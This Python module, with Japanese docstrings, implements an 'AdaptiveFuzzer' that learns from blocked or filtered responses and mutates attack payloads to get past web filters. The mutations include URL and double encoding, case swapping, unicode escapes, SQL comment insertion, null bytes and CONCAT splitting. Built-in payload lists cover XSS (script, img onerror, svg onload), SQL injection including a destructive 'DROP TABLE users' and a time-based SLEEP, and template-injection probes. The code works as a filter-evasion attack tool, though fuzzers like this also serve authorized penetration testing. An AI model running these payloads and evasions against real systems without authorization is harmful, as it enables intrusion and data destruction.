"""
AdaptiveFuzzer: 自己修正Fuzzing

失敗から学んでペイロードを動的に調整する。
成功/失敗パターンを分析して最適なペイロードを選択。
"""
from __future__ import annotations

import logging
import random
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional
import time

logger = logging.getLogger(__name__)


class FuzzResult(str, Enum):
    """Fuzz結果"""
    SUCCESS = "success"
    BLOCKED = "blocked"
    FILTERED = "filtered"
    NO_EFFECT = "no_effect"
    ERROR = "error"


@dataclass
class PayloadResult:
    """ペイロード結果"""
    payload: str
    result: FuzzResult
    response_code: Optional[int] = None
    response_snippet: Optional[str] = None
    timestamp: float = field(default_factory=time.time)


@dataclass
class AdaptedPayload:
    """適応されたペイロード"""
    original: str
    adapted: str
    mutation_type: str
    confidence: float  # 0.0 - 1.0
    reasoning: str


class AdaptiveFuzzer:
    """
    自己修正Fuzzing エンジン
    
    失敗したペイロードを分析し、成功確率を上げる
    ミューテーションを適用する。
    
    使用例:
        fuzzer = AdaptiveFuzzer()
        
        # 結果を報告
        fuzzer.report_result(PayloadResult(
            payload="<script>alert(1)</script>",
            result=FuzzResult.BLOCKED,
        ))
        
        # 適応されたペイロードを取得
        adapted = fuzzer.adapt_payload("<script>alert(1)</script>")
    """
    
    # ミューテーション戦略
    MUTATIONS = {
        "case_variation": lambda p: p.swapcase(),
        "url_encode": lambda p: AdaptiveFuzzer._url_encode(p),
        "double_encode": lambda p: AdaptiveFuzzer._double_encode(p),
        "unicode_escape": lambda p: AdaptiveFuzzer._unicode_escape(p),
        "comment_insert": lambda p: AdaptiveFuzzer._insert_comments(p),
        "null_byte": lambda p: p.replace(" ", "\x00"),
        "concat_split": lambda p: AdaptiveFuzzer._concat_split(p),
    }
    
    # ブロック時の優先ミューテーション
    BLOCK_MUTATIONS = ["url_encode", "case_variation", "unicode_escape"]
    
    # フィルタ時の優先ミューテーション
    FILTER_MUTATIONS = ["comment_insert", "double_encode", "concat_split"]
    
    def __init__(self):
        self._history: list[PayloadResult] = []
        self._success_cache: dict[str, str] = {}  # pattern -> successful mutation
    
    def report_result(self, result: PayloadResult) -> None:
        """
        ペイロード結果を報告
        
        Args:
            result: ペイロード結果
        """
        self._history.append(result)
        
        if result.result == FuzzResult.SUCCESS:
            # 成功パターンをキャッシュ
            base = self._extract_base_pattern(result.payload)
            self._success_cache[base] = result.payload
        
        logger.debug(
            "Payload result: %s -> %s",
            result.payload[:30],
            result.result.value,
        )
    
    def adapt_payload(
        self,
        payload: str,
        last_result: Optional[FuzzResult] = None,
    ) -> AdaptedPayload:
        """
        ペイロードを適応
        
        Args:
            payload: 元のペイロード
            last_result: 直前の結果（なければ履歴から推定）
            
        Returns:
            適応されたペイロード
        """
        # 成功キャッシュをチェック
        base = self._extract_base_pattern(payload)
        if base in self._success_cache:
            cached = self._success_cache[base]
            return AdaptedPayload(
                original=payload,
                adapted=cached,
                mutation_type="cached_success",
                confidence=0.85,
                reasoning="Using previously successful mutation",
            )
        
        # 結果に基づいてミューテーション選択
        result = last_result or self._guess_last_result(payload)
        mutations = self._select_mutations(result)
        
        if not mutations:
            return AdaptedPayload(
                original=payload,
                adapted=payload,
                mutation_type="none",
                confidence=0.5,
                reasoning="No suitable mutation found",
            )
        
        # ミューテーション適用
        mutation_name = random.choice(mutations)
        mutation_func = self.MUTATIONS.get(mutation_name)
        
        if mutation_func:
            try:
                adapted = mutation_func(payload)
                return AdaptedPayload(
                    original=payload,
                    adapted=adapted,
                    mutation_type=mutation_name,
                    confidence=0.6,
                    reasoning=f"Applied {mutation_name} mutation",
                )
            except Exception as e:
                logger.warning("Mutation failed: %s", e)
        
        return AdaptedPayload(
            original=payload,
            adapted=payload,
            mutation_type="fallback",
            confidence=0.4,
            reasoning="Mutation failed, using original",
        )
    
    def get_next_payload(
        self,
        category: str,
        exclude_failed: bool = True,
    ) -> Optional[AdaptedPayload]:
        """
        次に試すべきペイロードを取得
        
        Args:
            category: ペイロードカテゴリ（xss, sqli等）
            exclude_failed: 失敗したものを除外
            
        Returns:
            適応されたペイロード
        """
        base_payloads = self._get_base_payloads(category)
        
        if exclude_failed:
            failed = {r.payload for r in self._history if r.result != FuzzResult.SUCCESS}
            base_payloads = [p for p in base_payloads if p not in failed]
        
        if not base_payloads:
            return None
        
        # 優先度付け（成功キャッシュに近いものを優先）
        payload = random.choice(base_payloads)
        return self.adapt_payload(payload)
    
    def _select_mutations(self, result: Optional[FuzzResult]) -> list[str]:
        """結果に基づいてミューテーションを選択"""
        if result == FuzzResult.BLOCKED:
            return self.BLOCK_MUTATIONS
        elif result == FuzzResult.FILTERED:
            return self.FILTER_MUTATIONS
        elif result == FuzzResult.NO_EFFECT:
            return ["case_variation", "concat_split"]
        else:
            return list(self.MUTATIONS.keys())
    
    def _guess_last_result(self, payload: str) -> Optional[FuzzResult]:
        """履歴から最後の結果を推測"""
        for result in reversed(self._history):
            if self._similar_payload(result.payload, payload):
                return result.result
        return None
    
    def _similar_payload(self, p1: str, p2: str) -> bool:
        """ペイロードが類似しているか判定"""
        base1 = self._extract_base_pattern(p1)
        base2 = self._extract_base_pattern(p2)
        return base1 == base2
    
    def _extract_base_pattern(self, payload: str) -> str:
        """ペイロードの基本パターンを抽出"""
        import re
        # 数字と特殊文字を正規化
        normalized = re.sub(r'\d+', 'N', payload.lower())
        normalized = re.sub(r'[%\\]+', '_', normalized)
        return normalized[:30]
    
    def _get_base_payloads(self, category: str) -> list[str]:
        """カテゴリごとの基本ペイロードを取得"""
        payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "<img onerror=alert(1) src=x>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
            ],
            "sqli": [
                "' OR '1'='1",
                "1 UNION SELECT NULL--",
                "1' AND SLEEP(5)--",
                "'; DROP TABLE users--",
            ],
            "ssti": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
            ],
        }
        return payloads.get(category, [])
    
    @staticmethod
    def _url_encode(payload: str) -> str:
        """URLエンコード"""
        from urllib.parse import quote
        return quote(payload)
    
    @staticmethod
    def _double_encode(payload: str) -> str:
        """二重エンコード"""
        from urllib.parse import quote
        return quote(quote(payload))
    
    @staticmethod
    def _unicode_escape(payload: str) -> str:
        """Unicode エスケープ"""
        return "".join(
            f"\\u{ord(c):04x}" if c.isalpha() else c
            for c in payload
        )
    
    @staticmethod
    def _insert_comments(payload: str) -> str:
        """SQLコメント挿入"""
        import re
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
        result = payload
        for kw in keywords:
            result = re.sub(
                rf'\b{kw}\b',
                f'{kw[:1]}/**/{kw[1:]}',
                result,
                flags=re.IGNORECASE
            )
        return result
    
    @staticmethod
    def _concat_split(payload: str) -> str:
        """文字列連結分割"""
        if len(payload) < 6:
            return payload
        mid = len(payload) // 2
        return f"CONCAT('{payload[:mid]}','{payload[mid:]}')"
    
    def get_stats(self) -> dict:
        """統計情報を取得"""
        result_counts = {}
        for r in FuzzResult:
            result_counts[r.value] = sum(
                1 for pr in self._history if pr.result == r
            )
        
        return {
            "total_attempts": len(self._history),
            "result_counts": result_counts,
            "cached_patterns": len(self._success_cache),
            "success_rate": (
                result_counts.get("success", 0) / max(len(self._history), 1)
            ),
        }


# シングルトンインスタンス
_default_fuzzer: Optional[AdaptiveFuzzer] = None


def get_adaptive_fuzzer() -> AdaptiveFuzzer:
    """デフォルトのAdaptiveFuzzerインスタンスを取得"""
    global _default_fuzzer
    if _default_fuzzer is None:
        _default_fuzzer = AdaptiveFuzzer()
    return _default_fuzzer
